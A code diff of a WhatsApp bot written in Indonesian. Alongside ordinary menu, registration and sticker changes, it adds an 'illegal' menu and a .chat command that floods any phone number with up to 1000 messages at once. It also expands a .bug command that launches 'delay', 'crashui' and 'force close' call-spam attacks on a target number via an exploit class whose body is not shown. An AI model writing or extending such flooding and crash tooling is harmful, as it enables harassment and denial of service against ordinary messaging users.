-│     ʀᴇᴀʟ ᴏᴛᴘ ꜱᴘᴀᴍ (𝟺 ꜱᴇʀᴠɪᴄᴇꜱ)
-└─ `);
+                teksMenu = font(`
+▣ MENU ILEGAL
+══════════════
+> .bug
+> .spamcode
+> .spamotp`);
                 await kirimPaketMenu(from, teksMenu, msg.pushName || 'User');
                 break;
 
@@ -2851,6 +3175,7 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 > .cantik
 > .cekiq
 > .cekkhodam
+> .chat
 > .dare
 > .emot
 > .ganteng
@@ -2870,10 +3195,9 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
                 teksMenu = font(`
 ▣ AI ASSISTANT
 ══════════════
-> .ai
-> .aigambar
 > .aivideo
 > .clear
+> .quantumx
 `);
                 await kirimPaketMenuAI(from, teksMenu, msg.pushName || 'User');
                 break;
@@ -2886,8 +3210,8 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 > .igmp4
 > .sound
 > .spotify
-> .ttmp3
 > .ubahsuara
+> .ttmp3
 > .ttmp4
 > .ytmp3
 > .ytmp4`);
@@ -2899,14 +3223,13 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 ▣ MAKER / CREATOR
 ══════════════
 > .brat
-> .bratv2
 > .bratvid
-> .bratvidv2
 > .bratwarna
 > .carbon
 > .emojimix
 > .ipchat
 > .qc
+> .sertiftolol
 > .stiker
 > .teks
 > .toimg`);
@@ -2919,10 +3242,10 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 ══════════════
 > .ambilpp
 > .blur
+> .ceknik
 > .docx
 > .dwfoto
 > .dwvideo
-> .hitamkan
 > .igstalk
 > .melolo
 > .mirror
@@ -2995,11 +3318,13 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 > .antitoxic
 > .bebaskan
 > .cekpenjara
+> .clearskor
 > .dellskor
 > .hd
 > .hapusbg
 > .imgtoprompt
 > .kick
+> .ktp
 > .listvip
 > .listskor
 > .mute
@@ -3057,18 +3382,17 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
     }
 }
 
+
 function generateCode() {
   return Math.random().toString(36).substring(2, 7).toUpperCase()
 }
 
 // ==================== PRIVATE REGISTRATION GATE ====================
 if (!isGroup) {
-  // Owner bebas akses apa saja
-  if (isOwner(sender)) {
-    // lanjut ke handler command biasa
-  } else {
-    // User biasa → cek registrasi
-    const isRegistered = isUserTerdaftar(sender);
+    
+if (isOwner(sender)) { 
+     } else {
+        const isRegistered = isUserTerdaftar(sender);
 
     // Izinkan hanya command pendaftaran kalau belum terdaftar
     if (!isRegistered) {
@@ -3102,7 +3426,6 @@ Kamu belum terdaftar sebagai pengguna bot.
     }
   }
 }
-
 // ==================== .DAFTAR ====================
 if (body.trim() === '.daftar' && !isGroup) {
   console.log('[DAFTAR] User mencoba daftar:', sender);
@@ -3124,8 +3447,7 @@ if (body.trim() === '.daftar' && !isGroup) {
   };
   simpanUser();
 
-  await sock.sendMessage(from, {
-    text: font(
+  const teksDaftar = font(
 `📝 PENDAFTARAN BOT
 
 Kode verifikasi kamu:
@@ -3134,9 +3456,36 @@ Kode verifikasi kamu:
 📌 Untuk menyelesaikan pendaftaran:
 .konfirmasi ${kode}
 
-⚠️ Salah kode = gagal`
-    )
-  }, { quoted: msg });
+⚠️ Jangan berikan kode ini ke siapa pun.`
+  );
+
+  const interactive = proto.Message.InteractiveMessage.create({
+    body: proto.Message.InteractiveMessage.Body.create({
+      text: teksDaftar
+    }),
+    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+      buttons: [
+        {
+          name: "cta_copy",
+          buttonParamsJson: JSON.stringify({
+            display_text: "Salin Kode",
+            id: "copy_kode",
+            copy_code: kode
+          })
+        }
+      ]
+    })
+  });
+
+  const msgGenerated = generateWAMessageFromContent(
+    from,
+    { interactiveMessage: interactive },
+    { userJid: from, quoted: msg }
+  );
+
+  await sock.relayMessage(from, msgGenerated.message, {
+    messageId: msgGenerated.key.id
+  });
 
   console.log('[DAFTAR] Kode terkirim ke:', sender);
   return;
@@ -3188,6 +3537,8 @@ if (body.trim().startsWith('.konfirmasi') && !isGroup) {
 `✅ PENDAFTARAN BERHASIL
 
 Sekarang kamu sudah bisa menggunakan bot.
+
+Gunakan .menu untuk melihat daftar fitur yang tersedia.
 
 Selamat datang 👋`
     )
@@ -3796,55 +4147,6 @@ if (text === '.belibrat') {
     return;
 }
 
-// ==================== BELI BRAT V2 ====================
-if (text === '.belibratv2') {
-    const harga = 2500;
-    const durasiMenit = 5;
-    const user = normalizeJid(sender);
-
-    initUser(user);
-    const skor = skorUser[user]?.skor || 0;
-
-    // Cek akses permanen
-    if (isOwner(user) || isVIP(user, from)) {
-        await sock.sendMessage(from, { 
-            text: '✅ Kamu sudah punya akses permanen ke fitur *.bratv2*.' 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Cek akses sementara
-    const now = Date.now();
-    const isActive = hasTemporaryFeature(user, 'bratv2');
-
-    if (isActive) {
-        const expireTime = fiturSementara[user]['bratv2'].expired;
-        const sisaMenit = Math.ceil((expireTime - now) / 60000);
-        await sock.sendMessage(from, { 
-            text: `✅ Akses *.bratv2* masih aktif *${sisaMenit} menit* lagi.` 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Cek skor
-    if (skor < harga) {
-        await sock.sendMessage(from, { 
-            text: `❌ Skor tidak cukup!\nButuh *${harga}*, kamu punya *${skor}*` 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Proses pembelian
-    addSkor(user, -harga);
-    addTemporaryFeature(user, 'bratv2', durasiMenit);
-
-    const waktuBerakhir = moment(now + durasiMenit * 60 * 1000).tz('Asia/Jakarta').format('HH:mm:ss');
-    await sock.sendMessage(from, { 
-        text: `✅ *Akses Brat V2 Aktif!*\n\n⏱️ ${durasiMenit} menit\n💰 -${harga} skor\n🕒 Sampai: *${waktuBerakhir} WIB*` 
-    }, { quoted: msg });
-    await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-    return;
-}
 
 if (text === '.belibratvid') {
     const harga = 2500;
@@ -3879,56 +4181,6 @@ if (text === '.belibratvid') {
 
     const waktuBerakhir = moment(now + durasiMenit * 60 * 1000).tz('Asia/Jakarta').format('HH:mm:ss');
     await sock.sendMessage(from, { text: `✅ *Akses Bratvid Aktif!*\n\n⏱️ ${durasiMenit} menit\n💰 -${harga} skor\n🕒 Sampai: *${waktuBerakhir} WIB*` }, { quoted: msg });
-    await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-    return;
-}
-
-// ==================== BELI BRAT VID V2 ====================
-if (text === '.belibratvidv2') {
-    const harga = 2500;
-    const durasiMenit = 5;
-    const user = normalizeJid(sender);
-
-    initUser(user);
-    const skor = skorUser[user]?.skor || 0;
-
-    // Cek akses permanen
-    if (isOwner(user) || isVIP(user, from)) {
-        await sock.sendMessage(from, { 
-            text: '✅ Kamu sudah punya akses permanen ke fitur *.bratvidv2*.' 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Cek akses sementara
-    const now = Date.now();
-    const isActive = hasTemporaryFeature(user, 'bratvidv2');
-
-    if (isActive) {
-        const expireTime = fiturSementara[user]['bratvidv2'].expired;
-        const sisaMenit = Math.ceil((expireTime - now) / 60000);
-        await sock.sendMessage(from, { 
-            text: `✅ Akses *.bratvidv2* masih aktif *${sisaMenit} menit* lagi.` 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Cek skor
-    if (skor < harga) {
-        await sock.sendMessage(from, { 
-            text: `❌ Skor tidak cukup!\nButuh *${harga}*, kamu punya *${skor}*` 
-        }, { quoted: msg });
-        return;
-    }
-
-    // Proses pembelian
-    addSkor(user, -harga);
-    addTemporaryFeature(user, 'bratvidv2', durasiMenit);
-
-    const waktuBerakhir = moment(now + durasiMenit * 60 * 1000).tz('Asia/Jakarta').format('HH:mm:ss');
-    await sock.sendMessage(from, { 
-        text: `✅ *Akses Brat Vid V2 Aktif!*\n\n⏱️ ${durasiMenit} menit\n💰 -${harga} skor\n🕒 Sampai: *${waktuBerakhir} WIB*` 
-    }, { quoted: msg });
     await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
     return;
 }
@@ -4864,6 +5116,65 @@ if (text.startsWith('.kick')) {
         }
     }
 }
+
+if (body.startsWith('.clearskor')) {
+
+    // Validasi Owner / VIP
+    if (!isOwner(sender) && !isVIP(sender)) {
+        await sock.sendMessage(from, { 
+            text: '❌ Hanya Owner atau VIP yang bisa menghapus skor.' 
+        }, { quoted: msg });
+        return;
+    }
+
+    const modeZeroOnly = body.trim() === '.clearskor-0';
+    let count = 0;
+
+    if (modeZeroOnly) {
+
+    for (let jid in skorUser) {
+        if (skorUser[jid] && skorUser[jid].skor === 0) {
+            delete skorUser[jid];
+            count++;
+        }
+    }
+
+    if (count === 0) {
+        await sock.sendMessage(from, { 
+            text: '⚠️ Tidak ada skor bernilai 0.' 
+        }, { quoted: msg });
+        return;
+    }
+
+    saveSkor();
+
+    await sock.sendMessage(from, { 
+        text: `🗑️ Berhasil menghapus ${count} skor bernilai 0.` 
+    }, { quoted: msg });
+
+    return;
+}
+
+    // Default → hapus semua skor
+    const total = Object.keys(skorUser).length;
+
+    if (total === 0) {
+        await sock.sendMessage(from, { 
+            text: '⚠️ Tidak ada skor yang tersimpan.' 
+        }, { quoted: msg });
+        return;
+    }
+
+    skorUser = {};
+    saveSkor();
+
+    await sock.sendMessage(from, { 
+        text: `🗑️ Berhasil menghapus ${total} data skor.` 
+    }, { quoted: msg });
+
+    return;
+}
+
 if (body.startsWith('.dellskor')) {
     const args = body.trim().split(/\s+/);
 
@@ -5197,7 +5508,90 @@ if (msg.message?.extendedTextMessage?.contextInfo?.stanzaId) {
 }
 
 
+// ==================== CHAT ====================
+if (body.startsWith('.chat')) {
+    const args = body.trim().split(/\s+/);
+    
+    // Cek format: .chat 62xxx teks jumlah
+    if (args.length < 4) {
+        return sock.sendMessage(from, { 
+            text: '❌ Format salah!\nContoh: *.chat 62xxx halo kamu 100*\n\n📝 *Penjelasan:*\n• 62xxx = nomor tujuan\n• halo kamu = pesan yang dikirim\n• 100 = jumlah pengiriman' 
+        }, { quoted: msg });
+    }
 
+    // Ambil nomor tujuan
+    const nomor = args[1].replace(/[^0-9]/g, '');
+    if (!nomor || nomor.length < 10) {
+        return sock.sendMessage(from, { 
+            text: '❌ Nomor tidak valid! Minimal 10 digit.' 
+        }, { quoted: msg });
+    }
+
+    // Ambil jumlah pengiriman (parameter terakhir)
+    const jumlah = parseInt(args[args.length - 1]);
+    if (isNaN(jumlah) || jumlah < 1 || jumlah > 1000) {
+        return sock.sendMessage(from, { 
+            text: '❌ Jumlah harus antara 1 - 1000!' 
+        }, { quoted: msg });
+    }
+
+    // Ambil teks pesan (dari argumen ke-2 sampai sebelum jumlah)
+    const teksPesan = args.slice(2, args.length - 1).join(' ');
+    if (!teksPesan) {
+        return sock.sendMessage(from, { 
+            text: '❌ Teks pesan tidak boleh kosong!' 
+        }, { quoted: msg });
+    }
+
+    const target = normalizeJid(nomor + '@s.whatsapp.net');
+    
+    // Proteksi: Jangan chat bot sendiri
+    if (target === BOT_NUMBER) {
+        return sock.sendMessage(from, { 
+            text: '❌ Tidak bisa chat bot sendiri!' 
+        }, { quoted: msg });
+    }
+
+    // Kirim notifikasi mulai
+    await sock.sendMessage(from, { 
+        text: `⚡ *Memulai pengiriman cepat...*\n\n📱 Ke: @${nomor}\n📝 Pesan: "${teksPesan.substring(0, 30)}${teksPesan.length > 30 ? '...' : ''}"\n🔢 Jumlah: ${jumlah}x\n`,
+        mentions: [target]
+    }, { quoted: msg });
+
+    let terkirim = 0;
+    let gagal = 0;
+    
+    // KIRIM CEPAT TANPA DELAY - PAKAI PROMISE.ALL
+    const promises = [];
+    for (let i = 0; i < jumlah; i++) {
+        // Eksekusi promise tanpa menunggu
+        const promise = sock.sendMessage(target, { text: teksPesan })
+            .then(() => {
+                terkirim++;
+            })
+            .catch((err) => {
+                gagal++;
+                console.error(`❌ Gagal kirim ke-${i+1}:`, err);
+            });
+        
+        promises.push(promise);
+        
+        // Biarkan WhatsApp handle sendiri, kita lanjut loop
+    }
+    
+    // Tunggu semua selesai
+    await Promise.all(promises);
+
+    // Laporan hasil
+    const laporan = `✅ *PENGIRIMAN SELESAI!*\n\n📱 Ke: @${nomor}\n📝 Pesan: "${teksPesan.substring(0, 30)}${teksPesan.length > 30 ? '...' : ''}"\n✅ Terkirim: ${terkirim}x\n❌ Gagal: ${gagal}x\n`;
+
+    await sock.sendMessage(from, { 
+        text: laporan,
+        mentions: [target, sender]
+    }, { quoted: msg });
+
+    return;
+}
 
 // ================== TEBAK GAMBAR ==================
 if (text.trim() === '.tebakgambar') {
@@ -8056,7 +8450,45 @@ if (text.startsWith('.spamcode')) {
   await spamCode(sock, from, msg, text, sender);
 }
 
-// COMMAND HANDLER - FONT 𝐁𝐎𝐋𝐃 𝐊𝐄𝐑𝐄𝐍 𝐌𝐀𝐓𝐇𝐄𝐌𝐀𝐓𝐈𝐂𝐀𝐋 𝐒𝐀𝐍𝐒
+
+// ============== COMMAND HANDLER - .BUG STOP / .STOP ==============
+if (body === '.stop' || body.startsWith('.bug stop')) {
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 - 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘' });
+        return;
+    }
+
+    if (!isAttacking) {
+        await sock.sendMessage(from, { text: '𝐓𝐈𝐃𝐀𝐊 𝐀𝐃𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐘𝐀𝐍𝐆 𝐁𝐄𝐑𝐉𝐀𝐋𝐀𝐍!' });
+        return;
+    }
+
+    // SIMPAN NILAI DULU BIAR TEKS AKURAT
+    const savedMode = currentMode;
+    const savedTarget = currentTarget ? currentTarget.split('@')[0] : 'unknown';
+
+    // Request stop + force reset
+    stopRequested = true;
+    isAttacking = false;
+    currentMode = null;
+    currentTarget = null;
+
+    await sock.sendMessage(from, { 
+        text: `🛑 𝐅𝐎𝐑𝐂𝐄 𝐒𝐓𝐎𝐏 & 𝐅𝐋𝐀𝐆 𝐃𝐈𝐑𝐄𝐒𝐄𝐓!\n` +
+              `Mode: ${savedMode ? savedMode.toUpperCase() : 'UNKNOWN'}\n` +
+              `Target: ${savedTarget}\n` +
+              `Attack dihentikan.`
+    });
+
+    // Konfirmasi tambahan
+    setTimeout(() => {
+        sock.sendMessage(from, { text: '✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐃𝐈𝐇𝐄𝐍𝐓𝐈𝐊𝐀𝐍' });
+    }, 5000);
+
+    return;
+}
+
+// ============== COMMAND HANDLER - .BUG DENGAN 3 MODE (UTAMA) ==============
 if (body.startsWith('.bug')) {
     const args = body.trim().split(/ +/);
     if (from === 'status@broadcast' || from.includes('@broadcast')) return;
@@ -8066,13 +8498,26 @@ if (body.startsWith('.bug')) {
         return;
     }
 
+    // Safety net kalau ada .bug stop tapi lolos (jarang terjadi)
+    if (args[1] && args[1].toLowerCase() === 'stop') {
+        stopRequested = true;
+        isAttacking = false;
+        await sock.sendMessage(from, { text: '🛑 STOP DITERIMA (via fallback)' });
+        return;
+    }
+
     if (args.length < 2) {
-        await sock.sendMessage(from, { 
-            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n' +
-                  '• .bug <nomor> [jumlah]  → 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐁𝐀𝐂𝐊𝐆𝐑𝐎𝐔𝐍𝐃 𝐋𝐀𝐆\n\n' +
-                  'Default: 10 | Max: 50\n' +
-                  '𝐔𝐧𝐭𝐮𝐤 𝐭𝐞𝐬𝐭𝐢𝐧𝐠 & 𝐫𝐞𝐬𝐞𝐚𝐫𝐜𝐡 𝐨𝐧𝐥𝐲!'
-        });
+        let helpText = '𝐐𝐔𝐀𝐍𝐓𝐔𝐌𝐗 𝐁𝐔𝐆\n\n';
+        helpText += '𝐅𝐎𝐑𝐌𝐀𝐓:\n';
+        helpText += '• .bug 62xx delay [jumlah]\n';
+        helpText += '• .bug 62xx crashui [jumlah]\n';
+        helpText += '• .bug 62xx fc [detik]\n';
+        helpText += '• .bug stop / .stop → Hentikan attack yang sedang jalan\n\n';
+        helpText += '𝐂𝐎𝐍𝐓𝐎𝐇:\n';
+        helpText += '.bug 62812xxx delay 20\n';
+        helpText += '.bug 62812xxx fc 60\n';
+        helpText += '.bug stop\n';
+        await sock.sendMessage(from, { text: helpText });
         return;
     }
 
@@ -8081,10 +8526,8 @@ if (body.startsWith('.bug')) {
         await sock.sendMessage(from, { text: '𝐍𝐎𝐌𝐎𝐑 𝐈𝐍𝐕𝐀𝐋𝐈𝐃!' });
         return;
     }
-
     if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
     if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
-
     const targetJid = targetNum + '@s.whatsapp.net';
 
     try {
@@ -8098,44 +8541,79 @@ if (body.startsWith('.bug')) {
         return;
     }
 
-    // DEFAULT COUNT = 10
-    let count = 10;
+    let mode = 'delay';
+    let value = 10;
 
-    // CEK APAKAH USER NGASIH JUMLAH
     if (args.length > 2) {
-        count = parseInt(args[2]);
-        if (isNaN(count) || count < 1) {
-            count = 10;
+        const possibleMode = args[2].toLowerCase();
+        if (['delay', 'crashui', 'fc'].includes(possibleMode)) {
+            mode = possibleMode;
+            if (args.length > 3) {
+                let parsed = parseInt(args[3]);
+                if (!isNaN(parsed) && parsed > 0) {
+                    value = (mode === 'fc') ? Math.min(parsed, 300) : Math.min(parsed, 30);
+                }
+            }
+        } else {
+            let parsed = parseInt(args[2]);
+            if (!isNaN(parsed) && parsed > 0) {
+                value = Math.min(parsed, 30);
+            }
         }
-        if (count > 50) count = 50;
     }
 
-    // KIRIM PESAN MULAI
-    await sock.sendMessage(from, { 
-        text: `𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐈𝐌𝐔𝐋𝐀𝐈\n` +
-              `𝐌𝐎𝐃𝐄: 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐁𝐀𝐂𝐊𝐆𝐑𝐎𝐔𝐍𝐃 𝐋𝐀𝐆\n` +
+    if (!exploitSystem) exploitSystem = new QuantumXExploit(sock);
+
+    const modeDisplay = {
+        'delay': '🚨 𝐃𝐄𝐋𝐀𝐘 𝐁𝐑𝐔𝐓𝐀𝐋',
+        'crashui': '💥 𝐇𝐘𝐁𝐑𝐈𝐃 𝐂𝐑𝐀𝐒𝐇𝐔𝐈',
+        'fc': '☠️ 𝐅𝐎𝐑𝐂𝐄 𝐂𝐋𝐎𝐒𝐄'
+    };
+
+    // SET FLAG SEBELUM EXECUTE
+    isAttacking = true;
+    currentMode = mode;
+    currentTarget = targetJid;
+    stopRequested = false;
+
+    await sock.sendMessage(from, {
+        text: `𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐈𝐌𝐔𝐋𝐀𝐈\n\n` +
+              `𝐌𝐎𝐃𝐄 : ${modeDisplay[mode]}\n` +
               `𝐓𝐀𝐑𝐆𝐄𝐓: ${targetNum}\n` +
-              `𝐉𝐔𝐌𝐋𝐀𝐇: ${count}x`
+              `𝐉𝐔𝐌𝐋𝐀𝐇: ${mode === 'fc' ? value + ' 𝐝𝐞𝐭𝐢𝐤' : value + '𝐱'}\n` +
+              `𝐒𝐓𝐀𝐓𝐔𝐒: 𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆...`
     });
 
     let result;
     try {
-        result = await exploitSystem.normalAttack(targetJid, count);
+        result = await exploitSystem.execute(targetJid, mode, value);
     } catch (err) {
         await sock.sendMessage(from, { text: '𝐆𝐀𝐆𝐀𝐋: ' + (err.message || '𝐔𝐍𝐊𝐍𝐎𝐖𝐍') });
+        isAttacking = false;  // Reset kalau error
         return;
     }
 
-    // BUAT LAPORAN
-    let report = `𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊\n` +
-                 `𝐓𝐀𝐑𝐆𝐄𝐓: ${targetNum}\n` +
-                 `𝐉𝐔𝐌𝐋𝐀𝐇: ${count}x\n\n`;
+    let report = `𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊\n\n` +
+                 `𝐌𝐎𝐃𝐄 : ${modeDisplay[mode]}\n` +
+                 `𝐓𝐀𝐑𝐆𝐄𝐓: ${targetNum}\n`;
 
-    report += `𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐏𝐀𝐊𝐄𝐓: ${result.invisible.sent}/${result.invisible.total}\n`;
+    if (mode === 'fc') {
+        report += `𝐃𝐔𝐑𝐀𝐒𝐈 : ${result.duration || value} 𝐝𝐞𝐭𝐢𝐤\n` +
+                  `𝐂𝐀𝐋𝐋 𝐒𝐏𝐀𝐌 : ${result.sent || 0}\n`;
+    } else {
+        report += `𝐃𝐈𝐌𝐈𝐍𝐓𝐀 : ${result.total || value}𝐱\n` +
+                  `𝐒𝐔𝐊𝐒𝐄𝐒 : ${result.sent || 0}𝐱\n`;
+    }
 
-    report += `\n𝐓𝐎𝐓𝐀𝐋 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋: ${result.totalSent}/${count}`;
+    report += `𝐒𝐓𝐀𝐓𝐔𝐒: 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✓ ${result.stopped ? '(DIHENTIKAN MANUAL)' : ''}`;
 
     await sock.sendMessage(from, { text: report });
+
+    // RESET FLAG SETELAH SELESAI
+    isAttacking = false;
+    currentMode = null;
+    currentTarget = null;
+    stopRequested = false;
 }
 // Command handler
 if (body.startsWith('.spamotp')) {
@@ -10696,78 +11174,6 @@ if (/^\.bratvid(\s|$)/i.test(text)) {
 
 }
 
-// ==================== FITUR BRAT VID V2 ====================
-if (/^\.bratvidv2(\s|$)/i.test(text)) {
-    const userText = text.replace(/^\.bratvidv2/i, '').trim();
-    if (!userText) {
-        await sock.sendMessage(from, {
-            text: '❌ contoh: .bratvidv2 halo semua'
-        }, { quoted: msg });
-        return;
-    }
-
-    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-    const isBypass = isOwner(sender) || isVIP(sender, from);
-    const now = Date.now(); 
-    const isTemporaryActive = hasTemporaryFeature(sender, 'bratvidv2');
-
-    // limit per user
-    if (!(isBypass || isTemporaryActive)) {
-        const record = bratVidV2Limit.get(sender);
-        if (record) {
-            if (now - record.time < BRATVIDV2_COOLDOWN) {
-                if (record.count >= MAX_BRATVIDV2) {
-                    const sisa = Math.ceil((BRATVIDV2_COOLDOWN - (now - record.time)) / 60000);
-                    await sock.sendMessage(from, {
-                        text: `🚫 *Limit Tercapai*\n\nKamu hanya bisa memakai *.bratvidv2* ${MAX_BRATVIDV2}x selama 10 jam.\n⏳ Tunggu *${sisa} menit* lagi atau beli akses *.belibratvidv2* 5 menit.\n\n💡 *Tips:* Beli akses *VIP* agar bisa memakai *.bratvidv2* tanpa batas waktu.`,
-                        mentions: [sender]
-                    }, { quoted: msg });
-                    return;
-                } else record.count++;
-            } else {
-                bratVidV2Limit.set(sender, { count: 1, time: now });
-            }
-        } else {
-            bratVidV2Limit.set(sender, { count: 1, time: now });
-        }
-    }
-
-   try {
-    // 🔥 API BRAT ANIMATED V2 (RISSXD)
-    const apiURL = `https://www.rissxd.biz.id/api/maker/bratvid?keyze=free&text=${encodeURIComponent(userText)}`;
-
-    const res = await fetch(apiURL);
-    if (!res.ok) throw new Error("Gagal mengambil data dari API brat animated v2.");
-
-    const arrayBuf = await res.arrayBuffer();
-    const buffer = Buffer.from(arrayBuf);
-
-    // 🔥 STIKER ANIMASI
-    const sticker = new Sticker(buffer, {
-        pack: 'bratvidv2',
-        author: 'Fa',
-        type: StickerTypes.FULL_ANIMATED, // WAJIB untuk stiker gerak
-        quality: 100
-    });
-
-    const sent = await sock.sendMessage(from, await sticker.toMessage(), { quoted: msg });
-    await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-    // antistiker grup
-    if (from.endsWith('@g.us') && antiStickerGroups.get(from)) {
-        await hapusPesan(from, sent);
-        console.log("🗑️ Stiker .bratvidv2 bot ikut dihapus (antistiker aktif).");
-    }
-
-} catch (err) {
-    console.error("Error .bratvidv2 API rissxd:", err);
-    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
-    await sock.sendMessage(from, {
-        text: "❌ Gagal mengambil data dari API bratvidv2."
-    }, { quoted: msg });
-}
-}
 
 // Fitur .brat
 if (/^\.brat(\s|$)/i.test(text)) {
@@ -10840,79 +11246,6 @@ if (/^\.brat(\s|$)/i.test(text)) {
         text: "❌ Gagal mengambil data dari API brat."
     }, { quoted: msg });
 }
-}
-
-// ==================== FITUR BRAT V2 ====================
-if (/^\.bratv2(\s|$)/i.test(text)) {
-    const userText = text.replace(/^\.bratv2/i, '').trim();
-    if (!userText) {
-        await sock.sendMessage(from, {
-            text: '❌ contoh: .bratv2 halo semua'
-        }, { quoted: msg });
-        return;
-    }
-
-    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-    const isBypass = isOwner(sender) || isVIP(sender, from);
-    const now = Date.now();
-    const isTemporaryActive = hasTemporaryFeature(sender, 'bratv2');
-
-    // VIP / Owner / Temporary Access bebas limit
-    if (!(isBypass || isTemporaryActive)) {
-        const record = bratV2Limit.get(sender);
-        if (record) {
-            if (now - record.time < BRAT_V2_COOLDOWN) {
-                if (record.count >= MAX_BRAT_V2) {
-                    const sisa = Math.ceil((BRAT_V2_COOLDOWN - (now - record.time)) / 60000);
-                    await sock.sendMessage(from, {
-                        text: `🚫 *Limit Brat V2 Tercapai*\n\nKamu hanya bisa memakai *.bratv2* ${MAX_BRAT_V2}x selama 10 jam.\n⏳ Tunggu *${sisa} menit* lagi atau beli akses *.belibratv2* 5 menit.\n\n💡 *Tips:* Beli akses *VIP* agar bisa memakai *.bratv2* tanpa batas waktu.`,
-                        mentions: [sender]
-                    }, { quoted: msg });
-                    return;
-                } else {
-                    record.count++;
-                }
-            } else {
-                bratV2Limit.set(sender, { count: 1, time: now });
-            }
-        } else {
-            bratV2Limit.set(sender, { count: 1, time: now });
-        }
-    }
-
-    try {
-        // GANTI API KEY INI DENGAN YANG VALID DARI rissxd.biz.id
-        const apiURL = `https://www.rissxd.biz.id/api/maker/brat?keyze=free&text=${encodeURIComponent(userText)}`;
-
-        const res = await fetch(apiURL);
-        if (!res.ok) throw new Error("Gagal mengambil data dari API bratv2.");
-
-        const arrayBuf = await res.arrayBuffer();
-        const buffer = Buffer.from(arrayBuf);
-
-        const sticker = new Sticker(buffer, {
-            pack: 'brat v2',
-            author: 'Fa',
-            type: StickerTypes.FULL,
-            quality: 100
-        });
-
-        const sent = await sock.sendMessage(from, await sticker.toMessage(), { quoted: msg });
-        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-        if (from.endsWith('@g.us') && antiStickerGroups.get(from)) {
-            await hapusPesan(from, sent);
-            console.log("🗑️ Stiker .bratv2 bot ikut dihapus (antistiker aktif).");
-        }
-
-    } catch (err) {
-        console.error("Error .bratv2 API:", err);
-        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
-        await sock.sendMessage(from, {
-            text: "❌ Gagal mengambil data dari API bratv2."
-        }, { quoted: msg });
-    }
 }
 
 // ================== FITUR .BRATWARNA ==================
@@ -11330,126 +11663,6 @@ if (text.toLowerCase().startsWith('.ipchat')) {
     return;
 }
 
-// ================== FITUR .AIVIDEO ==================
-if (text.toLowerCase().startsWith('.aivideo')) {
-    const args = text.replace(/\.aivideo/i, '').trim().split(' ');
-
-       if (!isOwner(sender) && !isVIP(sender)) {
-        await sock.sendMessage(from, { 
-            text: '❌ Fitur *.aivideo* hanya untuk *VIP* dan *Owner*!' 
-        }, { quoted: msg });
-        await sock.sendMessage(from, { react: { text: '🔒', key: msg.key } });
-        return;
-    }
-    
-    if (args.length < 2) {
-        return sock.sendMessage(from, {
-            text: '❌ Contoh: *.aivideo kucing main bola 9:16*\n⚠️ Resolusi wajib: 9:16 atau 16:9'
-        }, { quoted: msg });
-    }
-
-    const ratio = args[args.length - 1]; // ambil kata terakhir sebagai ratio
-    const prompt = args.slice(0, -1).join(' '); // sisanya sebagai prompt
-
-    // validasi ratio
-    if (!['9:16', '16:9'].includes(ratio)) {
-        return sock.sendMessage(from, {
-            text: '❌ Resolusi tidak valid! Pilih *9:16* atau *16:9*'
-        }, { quoted: msg });
-    }
-
-    if (!prompt) {
-        return sock.sendMessage(from, {
-            text: '❌ Prompt tidak boleh kosong.'
-        }, { quoted: msg });
-    }
-
-    // react loading
-    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-    try {
-        const apiKey = 'freeApikey';
-        const apiURL = `https://anabot.my.id/api/ai/text2video?prompt=${encodeURIComponent(prompt)}&quality=720p&ratio=${encodeURIComponent(ratio)}&apikey=${encodeURIComponent(apiKey)}`;
-        
-        const res = await fetch(apiURL);
-        if (!res.ok) throw new Error('Gagal generate video AI');
-
-        const data = await res.json();
-        if (!data.success || !data.data?.result) throw new Error('API tidak mengembalikan video');
-
-        const videoURL = data.data.result;
-
-        // kirim video
-        await sock.sendMessage(from, {
-            video: { url: videoURL },
-            caption: `🎬 *AI Video*\n\n📝 Prompt:\n${prompt}\n📏 Resolusi: ${ratio}`
-        }, { quoted: msg });
-
-        // react sukses
